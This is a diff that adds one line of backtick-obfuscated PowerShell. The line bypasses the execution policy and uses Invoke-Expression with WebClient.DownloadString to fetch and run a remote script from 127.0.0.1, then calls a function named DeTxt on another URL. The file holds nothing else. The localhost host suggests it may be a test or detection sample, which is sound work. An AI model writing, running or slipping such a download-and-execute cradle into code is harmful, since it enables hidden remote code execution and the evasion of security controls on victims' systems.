@@ -1,0 +1,1 @@
+﻿d`Ir c:\;S`LEEP(5);SE`T-Ex`ecuTI`O`NPolIcY Bypass -Scope Process;SlE`ep(5);D`iR d:\;i`Ex ((n`E`W`-Object Net.WebClient).DownloadString('http://127.0.0.1/detxt.ps1') );d`Ir c:\;De`Txt http://127.0.0.1/1.txt;
